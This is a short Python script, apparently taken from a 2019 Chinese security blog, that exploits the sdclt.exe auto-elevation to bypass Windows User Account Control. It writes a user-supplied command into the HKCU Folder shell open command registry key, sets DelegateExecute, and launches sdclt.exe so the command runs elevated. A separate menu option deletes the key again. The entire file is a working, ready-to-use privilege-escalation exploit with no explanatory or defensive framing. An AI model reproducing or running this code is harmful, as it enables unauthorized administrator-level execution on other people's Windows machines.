#source:http://www.ggsec.cn/sdclt-bypassuac.html
#time:2019/1/24
#author:九世

import os

class Sdclt:
    def __init__(self,payload,delete):
        self.payload=payload
        self.dele=delete

    def deles(self):
        print('[h] dele Delete the legacy registry first:{}'.format(self.dele))
        os.system(self.dele)
    def systemsadd(self):
        zhixingcommand='%windir%\system32\sdclt.exe'
        print('[h] add payload in reg')
        os.system(self.payload)
        os.system(zhixingcommand)
if __name__ == '__main__':
    print('[h] Seting payload system command')
    user=input('Please command:')
    payload='reg add "HKCU\\Software\\Classes\\Folder\\shell\\open\\command" /d "{}" /f && reg add HKCU\\Software\\Classes\\Folder\\shell\\open\\command /v "DelegateExecute" /f'.format(user)
    obj=Sdclt(payload=payload,delete='reg delete "HKCU\Software\Classes\Folder\shell\open\command" /f')
    print('[1] dele Reg')
    print('[2] add Reg')
    xwen=input('->')
    if xwen=='1':
        obj.deles()
    elif xwen=='2':
        print('[h] payload:',payload)
        obj.systemsadd()
    else:
        exit('[q] Not Found... ')